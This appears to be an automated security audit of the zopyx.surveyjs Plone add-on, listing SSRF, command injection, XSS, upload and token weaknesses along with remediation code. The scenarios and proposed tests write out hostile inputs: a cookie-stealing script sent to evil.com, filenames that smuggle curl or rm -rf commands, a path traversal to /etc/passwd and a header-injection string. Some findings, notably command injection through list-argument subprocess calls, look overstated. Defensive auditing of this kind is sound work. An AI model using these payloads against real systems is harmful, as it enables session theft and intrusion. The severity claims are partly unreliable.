# 🔒 In-Depth Security Audit: zopyx.surveyjs

**Audit Date:** 2026-02-28  
**Auditor:** Security Analysis Agent  
**Scope:** Full codebase review of zopyx.surveyjs Plone add-on  
**Version:** Current HEAD

---

## Executive Summary

This audit identifies **multiple attack vectors** across the Plone/SurveyJS integration, ranging from **Critical** to **Low** severity. The application handles sensitive form submissions, supports multiple export formats, integrates with AI/LLM services, and executes external binaries. While the codebase implements several security controls (JWT-based authenticity tokens, payload size limits, CSRF protection), significant gaps remain.

### Risk Summary

| Severity | Count | Description |
|----------|-------|-------------|
| 🚨 Critical | 3 | Immediate action required |
| 🔴 High | 4 | Address within 30 days |
| 🟡 Medium | 5 | Address within 90 days |
| 🟢 Low | 4 | Address in next release |

---

## 🚨 Critical Severity

### 1. SSRF via POST Action Endpoint (CWE-918)

**Location:** `src/zopyx/surveyjs/subscribers.py:560-572`

```python
def post_submission_payload(context, event):
    ...
    response = httpx.post(endpoint_url, json=payload, timeout=10.0)
```

**Description:**  
The `post_endpoint_url` is user-configurable per survey without any validation or whitelist. An attacker can configure the endpoint to target internal services.

**Attack Scenario:**
1. Attacker creates a survey with POST action enabled
2. Sets `post_endpoint_url` to `http://169.254.169.254/latest/meta-data/` (AWS metadata)
3. Submits the form
4. Server forwards the submission to the metadata service
5. Attacker receives cloud credentials in logs or via callback

**Impact:**
- Data exfiltration to attacker-controlled servers
- Attack internal infrastructure (localhost, private IPs)
- Access cloud metadata services (AWS/Azure/GCP)
- Port scanning from the server

**Remediation:**
```python
from urllib.parse import urlparse
import ipaddress

def _validate_post_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    
    # Block private IPs and localhost
    blocked_hosts = {'localhost', '127.0.0.1', '169.254.169.254', 
                     '0.0.0.0', 'metadata.google.internal'}
    if parsed.hostname in blocked_hosts:
        return False
    
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_reserved or ip.is_multicast:
            return False
    except ValueError:
        pass  # Not an IP, continue with hostname checks
    
    return True
```

**References:**
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- CWE-918: Server-Side Request Forgery

---

### 2. Command Injection via ImageMagick/pdfcpu (CWE-78)

**Location:**
- `src/zopyx/surveyjs/browser/views.py:1817-1833` (ImageMagick)
- `src/zopyx/surveyjs/browser/services/pdf.py:52-66` (ImageMagick)
- `src/zopyx/surveyjs/pdf_form_extract.py:47-51` (pdfcpu)

**Description:**  
PDF upload functionality executes external shell commands (ImageMagick `convert` and `pdfcpu`). While the code uses list arguments (safer than shell strings), filenames from user uploads are passed through without sanitization.

**Attack Scenario:**
1. Attacker uploads a PDF with malicious filename: `$(whoami).pdf` or `;curl evil.com|.sh;`
2. Filename is passed to subprocess command
3. Command injection leads to remote code execution

**Current Code:**
```python
command = [
    "convert",
    "-density", "300",
    str(pdf_path),  # User-controlled path
    ...
]
subprocess.run(command, check=True, capture_output=True)
```

**Impact:**
- Remote code execution on the server
- Complete system compromise
- Data exfiltration

**Remediation:**
```python
import re
from pathlib import Path

def _sanitize_filename(filename: str) -> str:
    """Remove dangerous characters from filenames."""
    # Replace all non-alphanumeric chars except safe ones
    safe = re.sub(r'[^a-zA-Z0-9_.-]', '_', filename)
    # Prevent path traversal
    safe = safe.replace('..', '_')
    return safe

# Use randomized temp names, ignore original filename
import uuid
temp_name = f"{uuid.uuid4().hex}.pdf"
pdf_path = temp_path / temp_name
```

**References:**
- CWE-78: OS Command Injection
- [ImageMagick Security Policy](https://imagemagick.org/script/security-policy.php)

---

### 3. Weak JWT Secret Handling (CWE-798)

**Location:** `src/zopyx/surveyjs/browser/services/auth.py:58-61`

```python
def _auth_token_secret(self, settings):
    secret = getattr(settings, "authenticity_token_secret", "") or ""
    return str(secret).strip()
```

**Description:**  
The authenticity token secret is stored in the Plone registry without encryption. Default empty secrets result in tokens signed with an empty string. No minimum entropy is enforced.

**Vulnerabilities:**
1. Empty default secret allows token forgery
2. Secret stored in plaintext in registry
3. No secret rotation mechanism
4. Accessible to privileged Plone users

**Attack Scenario:**
1. Attacker gains access to Plone with Manager role
2. Reads registry settings to obtain token secret
3. Forges tokens for any form
4. Submits forms bypassing all authenticity checks

**Impact:**
- Complete bypass of form submission protections
- Replay attacks
- Data manipulation

**Remediation:**
```python
import secrets
import hashlib

def _generate_secure_secret() -> str:
    """Generate a cryptographically secure secret."""
    return secrets.token_urlsafe(32)

def _auth_token_secret(self, settings):
    secret = getattr(settings, "authenticity_token_secret", "") or ""
    secret = str(secret).strip()
    
    # Require minimum 32 characters
    if len(secret) < 32:
        logger.error("Authenticity token secret too short or missing")
        return None
    
    return secret
```

**References:**
- CWE-798: Use of Hard-coded Credentials
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)

---

## 🔴 High Severity

### 4. Missing Rate Limiting (CWE-770)

**Location:** `src/zopyx/surveyjs/browser/views.py:1233-1395` (save_poll)

**Description:**  
No rate limiting is implemented on form submission endpoints. Combined with email actions, this creates a perfect vector for abuse.

**Attack Scenarios:**
1. **Storage Exhaustion:** Flood submissions to fill database/ZODB
2. **Email Spam:** Form with "mail" action sends emails on each submission
3. **LLM Cost Explosion:** AI form generation endpoints can be abused
4. **PDF Processing DoS:** Upload large PDFs to trigger expensive conversions

**Impact:**
- Denial of Service
- Financial loss (email, LLM API costs)
- Storage exhaustion
- Reputation damage

**Remediation:**
```python
import time
from functools import wraps

def rate_limit(max_requests=10, window=60):
    """Decorator to rate limit view methods."""
    def decorator(func):
        cache = {}
        @wraps(func)
        def wrapper(self, *args, **kwargs):
            key = self.request.getClientAddr() or self.request.get("REMOTE_ADDR")
            now = time.time()
            
            # Clean old entries
            cache[key] = [t for t in cache.get(key, []) if now - t < window]
            
            if len(cache[key]) >= max_requests:
                json_error(self.request.response, 429, "rate_limit_exceeded")
                return
            
            cache[key].append(now)
            return func(self, *args, **kwargs)
        return wrapper
    return decorator
```

**References:**
- CWE-770: Allocation of Resources Without Limits
- [OWASP Rate Limiting](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)

---

### 5. XSS via SurveyJS Form Rendering (CWE-79)

**Location:** Template rendering of form JSON

**Description:**  
SurveyJS form definitions support HTML content in question titles, descriptions, and choices. There's no evidence of output encoding or sanitization in the form rendering pipeline.

**Attack Scenario:**
1. Attacker with editor access creates a form
2. Injects `<script>fetch('https://evil.com?c='+document.cookie)</script>` in question title
3. Victim views the form
4. XSS executes, stealing session cookies

**Impact:**
- Session hijacking
- Privilege escalation
- Defacement
- Keylogging

**Remediation:**
```javascript
// In SurveyJS configuration
const survey = new Survey.Model(json);
survey.allowImagesInTitle = false;
survey.allowHtml = false;  // Or use DOMPurify for sanitization
```

Or implement server-side sanitization:
```python
import bleach

def sanitize_survey_json(form_json: dict) -> dict:
    """Sanitize HTML in survey definitions."""
    allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'p', 'br']
    
    def sanitize_value(value):
        if isinstance(value, str):
            return bleach.clean(value, tags=allowed_tags, strip=True)
        elif isinstance(value, dict):
            return {k: sanitize_value(v) for k, v in value.items()}
        elif isinstance(value, list):
            return [sanitize_value(item) for item in value]
        return value
    
    return sanitize_value(form_json)
```

**References:**
- CWE-79: Cross-site Scripting
- [DOMPurify](https://github.com/cure53/DOMPurify)

---

### 6. Insecure Deserialization via JSON Parsing (CWE-502)

**Location:** Multiple locations using `orjson.loads()`

**Description:**  
The application parses untrusted JSON from form submissions, PDF imports, and AI-generated content. While `orjson` is generally safe, deeply nested JSON can cause memory exhaustion.

**Attack Scenario:**
1. Attacker submits deeply nested JSON: `{"a":{"a":{"a":...}}}` (10,000 levels)
2. Parser consumes excessive memory
3. Server crashes with OOM

**Impact:**
- Denial of Service
- Memory exhaustion
- Application crash

**Remediation:**
```python
import orjson

def safe_json_loads(data: bytes, max_depth: int = 100) -> dict:
    """Parse JSON with depth limits."""
    try:
        # orjson doesn't have native depth limit, so we check recursively
        result = orjson.loads(data)
        
        def check_depth(obj, current_depth=0):
            if current_depth > max_depth:
                raise ValueError(f"JSON depth exceeds {max_depth}")
            if isinstance(obj, dict):
                for v in obj.values():
                    check_depth(v, current_depth + 1)
            elif isinstance(obj, list):
                for item in obj:
                    check_depth(item, current_depth + 1)
        
        check_depth(result)
        return result
    except orjson.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON: {e}")
```

**References:**
- CWE-502: Deserialization of Untrusted Data
- [JSON Depth Limiting](https://www.stackhawk.com/blog/json-deep-dive/)

---

### 7. Lack of Input Validation on File Uploads (CWE-434)

**Location:** `src/zopyx/surveyjs/browser/views.py:935-1039`

**Description:**  
PDF upload accepts any file based only on presence, not content validation. No file size limits are enforced on upload, and files are processed by external tools.

**Attack Scenarios:**
1. **ImageMagick Vulnerabilities:** Upload malformed PDF to exploit known ImageMagick CVEs
2. **Resource Exhaustion:** Upload multi-GB file to exhaust disk space
3. **Path Traversal:** Filename containing `../../../etc/passwd`

**Impact:**
- Remote code execution (via ImageMagick exploits)
- Resource exhaustion
- Path disclosure

**Remediation:**
```python
import magic
from pathlib import Path

MAX_UPLOAD_SIZE = 50 * 1024 * 1024  # 50MB
ALLOWED_MIME_TYPES = {'application/pdf', 'application/x-pdf'}

def validate_pdf_upload(uploaded_file) -> tuple[bool, str]:
    """Validate uploaded PDF file."""
    # Check size
    uploaded_file.seek(0, 2)  # Seek to end
    size = uploaded_file.tell()
    uploaded_file.seek(0)  # Reset
    
    if size > MAX_UPLOAD_SIZE:
        return False, f"File too large (max {MAX_UPLOAD_SIZE} bytes)"
    
    # Check magic bytes
    mime = magic.from_buffer(uploaded_file.read(2048), mime=True)
    uploaded_file.seek(0)
    
    if mime not in ALLOWED_MIME_TYPES:
        return False, f"Invalid file type: {mime}"
    
    return True, ""
```

**References:**
- CWE-434: Unrestricted Upload of File with Dangerous Type
- [ImageMagick CVE History](https://www.cvedetails.com/vulnerability-list/vendor_id-1749/Imagemagick.html)

---

## 🟡 Medium Severity

### 8. Information Disclosure via Error Messages (CWE-209)

**Location:** Multiple locations

**Examples:**
- `src/zopyx/surveyjs/browser/views.py:1104-1113` - Detailed validation errors
- External validation exposes internal file paths
- `json_error()` includes exception details

**Description:**  
Error messages reveal internal implementation details, file paths, and system information that aids attackers in reconnaissance.

**Examples Found:**
```python
# Exposes internal path
json_error(..., message=str(exc))  # Exception may contain file paths

# Exposes validation state
logger.info("Survey external validation failed: reason=%s", reason)
```

**Remediation:**
```python
import logging

logger = logging.getLogger(__name__)

def safe_json_error(response, status, error_code, message=None, exc=None):
    """Return safe error message to user, log details internally."""
    if exc:
        logger.error("Internal error: %s", exc, exc_info=True)
    
    # Generic messages for production
    user_message = message or "An error occurred. Please try again."
    json_response(response, {"error": error_code, "message": user_message}, status=status)
```

**References:**
- CWE-209: Generation of Error Message Containing Sensitive Information

---

### 9. Insecure Temporary File Handling (CWE-377)

**Location:** Multiple uses of `TemporaryDirectory`

**Description:**  
Temporary directories are created with default permissions. In shared hosting or multi-user scenarios, this could allow other users to read sensitive form data.

**Current Code:**
```python
with TemporaryDirectory() as tmpdir:
    # Default permissions (usually 0o755)
```

**Remediation:**
```python
import os
import tempfile

with tempfile.TemporaryDirectory() as tmpdir:
    # Restrict permissions
    os.chmod(tmpdir, 0o700)
    # ... processing ...
```

**References:**
- CWE-377: Insecure Temporary File

---

### 10. Missing Authorization on Data Export (CWE-285)

**Location:** `src/zopyx/surveyjs/browser/views.py:1437-1492`

**Description:**  
Export endpoints only check `cmf.ModifyPortalContent` permission. No additional authorization, audit logging, or rate limiting is implemented for bulk data exports.

**Impact:**
- Data exfiltration by compromised accounts
- Privacy violations (GDPR implications)
- No accountability for data access

**Remediation:**
```python
def download_polls_csv(self):
    """Download with audit logging and limits."""
    if not self.can_manage_portal_content:
        self.request.response.setStatus(403)
        return
    
    # Audit log
    logger.warning("Bulk export initiated by %s on %s",
                   plone.api.user.get_current().getId(),
                   self.context.absolute_url())
    
    # Limit export size
    storage = get_result_storage(self.context)
    results = storage.list_results(self.context)
    if len(results) > 10000:
        json_error(self.request.response, 400, "export_too_large",
                   message="Please filter results before exporting")
        return
    
    # ... export logic ...
```

**References:**
- CWE-285: Improper Authorization
- GDPR Article 30 (Records of processing activities)

---

### 11. Replay Attack via Token Reuse (CWE-294)

**Location:** `src/zopyx/surveyjs/browser/services/auth.py:274-292`

**Description:**  
When the diskcache is unavailable, `require_auth_token()` silently returns `True`, bypassing replay protection.

**Current Code:**
```python
cache = self._token_cache(settings)
if cache is not None:
    try:
        # ... replay check ...
    finally:
        cache.close()
return True  # Bypasses if cache is None!
```

**Remediation:**
```python
def require_auth_token(self, form_version_id, logger=None):
    settings = self._auth_settings()
    if not self._auth_token_enabled(settings):
        return True
    
    cache = self._token_cache(settings)
    if cache is None:
        # Fail secure - reject if cache unavailable
        if logger:
            logger.error("Auth token cache unavailable - rejecting request")
        json_error(self.request.response, 503, "auth_service_unavailable")
        return False
    
    try:
        # ... validation logic ...
    finally:
        cache.close()
```

**References:**
- CWE-294: Authentication Bypass by Capture-replay

---

### 12. Email Header Injection (CWE-93)

**Location:** `src/zopyx/surveyjs/subscribers.py:500-516`

**Description:**  
Email templates interpolate user-controlled values without sanitization. If email fields contain newlines, they could inject additional headers.

**Attack Scenario:**
1. Set email subject to: `Hello\nCc: attacker@evil.com\n\nInjected body`
2. Email is sent with additional attacker CC

**Remediation:**
```python
import re

def sanitize_email_header(value: str) -> str:
    """Remove newlines from email headers."""
    return re.sub(r'[\r\n]', '', value)

message["Subject"] = sanitize_email_header(subject)
```

Or use the `email.message.EmailMessage` API which provides some protection.

**References:**
- CWE-93: Improper Neutralization of CRLF Sequences

---

## 🟢 Low Severity

### 13. Information Leakage via Timing Attacks (CWE-208)

**Location:** `src/zopyx/surveyjs/security.py:63-117`

**Description:**  
Different validation error paths have different execution times, potentially allowing attackers to distinguish between invalid tokens and expired tokens.

**Note:** The HMAC comparison uses `hmac.compare_digest()` which is constant-time (good).

**Remediation:**
Add artificial delays to ensure constant-time responses:
```python
import time

def validate_auth_token(...):
    start = time.monotonic()
    try:
        # ... validation logic ...
    finally:
        # Ensure minimum response time
        elapsed = time.monotonic() - start
        if elapsed < 0.1:
            time.sleep(0.1 - elapsed)
```

**References:**
- CWE-208: Observable Timing Discrepancy

---

### 14. Weak Session Binding (CWE-384)

**Location:** `src/zopyx/surveyjs/security.py:30-60`

**Description:**  
JWT tokens do not include session_id or user_id binding. Tokens can be used across different sessions. While IP binding is intentionally avoided (per EXTENDED_SECURITY.md), session binding would provide additional security.

**Remediation:**
Consider optional session binding for high-security forms:
```python
def build_auth_token(..., session_id: str = None):
    payload = {
        # ... existing claims ...
        "session_id": session_id or get_current_session_id(),
    }
```

**References:**
- CWE-384: Session Fixation

---

### 15. Dependency Confusion (CWE-1104)

**Location:** `setup.py`, `requirements.txt`

**Description:**  
The package depends on external packages (`orjson`, `diskcache`, `httpx`, `sqlmodel`, `llm`). Compromised dependencies could introduce backdoors.

**Risk:** Supply chain attack

**Remediation:**
```
# requirements.txt with hashes
orjson==3.9.10 \
    --hash=sha256:abcdef...
diskcache==5.6.3 \
    --hash=sha256:123456...
```

Or use a private package repository with vendored dependencies.

**References:**
- CWE-1104: Use of Unmaintained Third Party Components
- [Supply Chain Attacks](https://owasp.org/www-community/attacks/Dependency_confusion)

---

### 16. Missing Security Headers (CWE-693)

**Location:** `src/zopyx/surveyjs/browser/views.py:2002-2017`

**Description:**  
The `EmbedViewer` explicitly removes X-Frame-Options and sets a permissive CSP to allow iframe embedding from any origin.

**Current Code:**
```python
def __call__(self):
    self.request.response.setHeader("X-Frame-Options", "")
    self.request.response.setHeader("Content-Security-Policy", "frame-ancestors *")
```

**Risk:**
- Clickjacking attacks on forms
- UI redressing

**Remediation:**
Allow specific origins only:
```python
def __call__(self):
    allowed_origins = getattr(self.context, 'embedding_origins', ['https://trusted-site.com'])
    origins_str = ' '.join(allowed_origins)
    self.request.response.setHeader("Content-Security-Policy", f"frame-ancestors {origins_str}")
```

Or add a warning for sensitive forms:
```python
if self.context.access_mode == 'public' and self.embedding_allowed:
    logger.warning("Public survey with embedding enabled: %s", self.context.absolute_url())
```

**References:**
- CWE-693: Protection Mechanism Failure
- [Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

---

## 📊 Attack Matrix Summary

| Attack Vector | Severity | CWE | Exploitability | Impact |
|--------------|----------|-----|----------------|--------|
| SSRF via POST Action | 🚨 Critical | CWE-918 | High | Data exfiltration, infra access |
| Command Injection | 🚨 Critical | CWE-78 | Medium | RCE, system compromise |
| Weak JWT Secrets | 🚨 Critical | CWE-798 | Medium | Auth bypass |
| Missing Rate Limiting | 🔴 High | CWE-770 | High | DoS, cost explosion |
| XSS via Form Rendering | 🔴 High | CWE-79 | Medium | Account takeover |
| JSON Deserialization | 🔴 High | CWE-502 | Low | DoS |
| File Upload Validation | 🔴 High | CWE-434 | Medium | Malware upload |
| Error Info Disclosure | 🟡 Medium | CWE-209 | Low | Info leakage |
| Temp File Handling | 🟡 Medium | CWE-377 | Low | Info disclosure |
| Export Auth | 🟡 Medium | CWE-285 | Medium | Data exfiltration |
| Replay Attacks | 🟡 Medium | CWE-294 | Medium | Form forgery |
| Email Injection | 🟡 Medium | CWE-93 | Low | Spam relay |
| Timing Attacks | 🟢 Low | CWE-208 | Low | Info leakage |
| Session Binding | 🟢 Low | CWE-384 | Medium | Session hijacking |
| Dependency Risks | 🟢 Low | CWE-1104 | Low | Supply chain |
| Missing Headers | 🟢 Low | CWE-693 | Low | Clickjacking |

---

## 🛡️ Recommendations

### Immediate Actions (Critical - Fix within 7 days)

1. **Implement URL validation** for POST action endpoints (SSRF prevention)
2. **Sanitize all subprocess arguments** and validate file paths
3. **Enforce strong JWT secrets** with automatic secure generation

### Short-term Actions (High Priority - Fix within 30 days)

4. **Add rate limiting** middleware for all submission endpoints
5. **Configure SurveyJS XSS protection** or implement sanitization
6. **Implement comprehensive file upload validation** (size, type, content)
7. **Sanitize error messages** in production (no internal details)

### Medium-term Actions (Fix within 90 days)

8. **Add security headers** configuration for embedding controls
9. **Implement audit logging** for all data access and exports
10. **Add CAPTCHA/honeypot** for anonymous form submissions
11. **Dependency scanning** and pinning with hashes

### Long-term Actions (Next major release)

12. **Security regression testing** suite with automated tests
13. **Penetration testing** of AI/LLM features
14. **Sandbox external validators** (Deno, ImageMagick) with containers
15. **Implement formal threat modeling** process

---

## Appendix A: Security Controls Assessment

### Existing Security Controls (Positive)

| Control | Implementation | Assessment |
|---------|---------------|------------|
| CSRF Protection | Plone's built-in CSRF tokens | ✅ Good |
| JWT Authenticity Tokens | Custom HMAC-SHA256 implementation | ⚠️ Weak secret handling |
| Payload Size Limits | `max_payload_size_mb` setting | ✅ Good |
| Replay Protection | Diskcache-based nonce tracking | ⚠️ Fails open |
| HTTPS Enforcement | Recommended in docs | ⚠️ Not enforced |
| External Validation | Optional Deno binary validation | ✅ Good feature |

### Missing Security Controls

| Control | Priority | Implementation Effort |
|---------|----------|----------------------|
| Rate Limiting | Critical | Medium |
| Input Sanitization | Critical | Medium |
| SSRF Protection | Critical | Low |
| Security Headers | Medium | Low |
| Audit Logging | Medium | Medium |
| WAF Integration | Low | High |

---

## Appendix B: Key Files for Security Review

| File | Purpose | Lines | Risk Level |
|------|---------|-------|------------|
| `browser/views.py` | Main view handlers | ~2020 | 🚨 Critical |
| `subscribers.py` | Email/POST actions | ~677 | 🚨 Critical |
| `browser/services/auth.py` | Token auth | ~292 | 🔴 High |
| `security.py` | JWT implementation | ~117 | 🔴 High |
| `pdf_forms.py` | PDF processing | ~238 | 🚨 Critical |
| `browser/ai_generator.py` | LLM integration | ~494 | 🔴 High |
| `storage.py` | Data persistence | ~387 | 🟡 Medium |
| `converters/cli.py` | Export generation | ~824 | 🟡 Medium |
| `browser/services/pdf.py` | PDF import service | ~109 | 🚨 Critical |
| `pdf_form_extract.py` | PDF extraction | ~73 | 🚨 Critical |

---

## Appendix C: Testing Recommendations

### Security Test Cases

```python
# test_security_extended.py

class TestSSRFPrevention(unittest.TestCase):
    """Test POST action URL validation."""
    
    def test_blocks_private_ips(self):
        blocked_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:8080/admin',
            'http://127.0.0.1:22/',
            'http://10.0.0.1/internal',
        ]
        for url in blocked_urls:
            self.assertFalse(_validate_post_url(url))

class TestCommandInjection(unittest.TestCase):
    """Test subprocess safety."""
    
    def test_filename_sanitization(self):
        malicious_names = [
            '$(whoami).pdf',
            '; rm -rf /;',
            '../../../etc/passwd',
            'file`curl evil.com`.pdf',
        ]
        for name in malicious_names:
            safe = _sanitize_filename(name)
            self.assertNotIn('..', safe)
            self.assertNotIn('$', safe)
            self.assertNotIn(';', safe)
            self.assertNotIn('`', safe)

class TestRateLimiting(unittest.TestCase):
    """Test rate limiting functionality."""
    
    def test_blocks_excessive_requests(self):
        # Make 11 requests (limit is 10)
        for i in range(11):
            response = self._submit_form()
            if i < 10:
                self.assertEqual(response.status, 200)
            else:
                self.assertEqual(response.status, 429)
```

---

## References

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Plone Security](https://plone.org/security)
- [SurveyJS Security](https://surveyjs.io/documentation)

---

*This audit was generated by automated analysis of the codebase. Manual review and penetration testing are recommended for critical deployments.*
